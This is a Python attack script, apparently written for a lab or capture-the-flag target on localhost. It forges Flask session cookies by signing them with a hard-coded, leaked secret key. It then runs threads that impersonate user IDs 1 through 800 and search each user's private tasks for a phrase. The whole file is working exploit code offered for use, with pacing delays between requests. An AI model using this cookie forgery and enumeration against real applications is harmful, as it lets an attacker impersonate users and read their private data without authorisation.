from flask import session
from flask.sessions import SecureCookieSessionInterface
import requests
import threading
import time
import random
from secrets import token_hex
from flask import Flask

# Create a minimal Flask application to properly handle sessions
app = Flask(__name__)
app_secret_key = 'UnlimitedPower'  # Replace with your actual app's secret key
app.secret_key = app_secret_key

# Initialize the session interface
serializer = SecureCookieSessionInterface()

url = 'http://localhost:4553/tasks'

def getCookies(id):
    data = {
        'userid': id,
        'username': "your_username_here",  # Replace with the correct username
        'logged': True
    }
    
    # Create a session object
    session = serializer.session_class()
    session.update(data)
    session["_fresh"] = True
    session["_CID"] = token_hex(16)  # Generate a random session ID
    
    # Serialize the session using the Flask app's secret key
    session_cookie = serializer.get_signing_serializer(app).dumps(session)
    
    return session_cookie

def check_task_encoded(session_id, phrase):
    url = 'http://localhost:4553/tasks?completed=false'

    cookie = getCookies(session_id)

    headers = {'Cookie': f'session={cookie}'}
    response = requests.get(url, headers=headers, allow_redirects=False)
    try:
        tasks = response.json().get('tasks', [])
    except Exception:
        return None

    for task in tasks:
        title = task.get('title', '')
        if phrase.lower() in title.lower():
            description = task.get('description', '')
            return f"ID: {task.get('taskid', '')}\n title: {title} description: {description}\n"
    return None

def findTask(phrase, end, start=1, stop_event=None, result_holder=None):
    if end < start:
        raise ValueError("End must be greater than or equal to start")
    id = start
    response = None
    while response is None and id < end:
        if stop_event and stop_event.is_set():
            return  # Stop if another thread found the result
        print(f"[Thread {start}-{end-1}] Checking ID: {id}")
        try:
            response = check_task_encoded(id, phrase)
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
        if response is not None:
            print(f"[Thread {start}-{end-1}] Found phrase in ID: {id}")
            if result_holder is not None:
                result_holder['result'] = response
            if stop_event:
                stop_event.set()
            return
        id += 1
        time.sleep(random.uniform(0.001, 0.1))  # Sleep to avoid overwhelming the server

    print(f"[Thread {start}-{end-1}] Finished without finding phrase.")

def multThreadedFindTask(phrase, max_id=800, batch_size=20):
    threads = []
    stop_event = threading.Event()
    result_holder = {}
    for start in range(1, max_id + 1, batch_size):
        end = min(start + batch_size, max_id + 1)
        thread = threading.Thread(
            target=findTask,
            args=(phrase, end, start, stop_event, result_holder)
        )
        threads.append(thread)
        thread.start()
        time.sleep(random.uniform(0.01, 0.2))  # Sleep to avoid overwhelming the server
    for thread in threads:
        thread.join()
    return result_holder.get('result', "Phrase not found in any task.")

# Example usage
print("What phrase do you want to search for?")
phrase = input()
print("Searching for tasks with phrase:", phrase)
print(multThreadedFindTask(phrase))